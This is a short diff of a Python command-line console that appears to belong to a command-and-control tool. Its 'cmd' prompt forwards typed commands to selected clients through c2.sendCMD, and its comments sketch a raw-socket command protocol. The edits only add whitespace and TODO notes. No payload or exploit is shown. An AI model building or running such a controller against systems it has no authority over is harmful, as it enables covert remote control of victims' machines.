@@ -158,6 +158,7 @@ def interactPrompt(interactType, id, TS):
 
         elif user_input == "cmd":
             cmdPrompt(interactType, id, TS)
+            
 
         elif user_input == "help":
             print('Interact Subcommand List')
@@ -209,7 +210,9 @@ def cmdPrompt(interactType, id, TS):
         elif user_input == "clear":
             system('clear')
         else:
-            c2.sendCMD(TS, user_input, interactType, id) #TODO what about running exes/commands that hang?s
+            #TODO sending quotes (and other chars) is being weird, fix this
+            c2.sendCMD(TS, user_input, interactType, id) #TODO what about running exes/commands that hang?
+            
             #S: encode command
             #S: send commandpacket to selected client
             #C: raw socket looking for identifier (ref id comd?), parse command
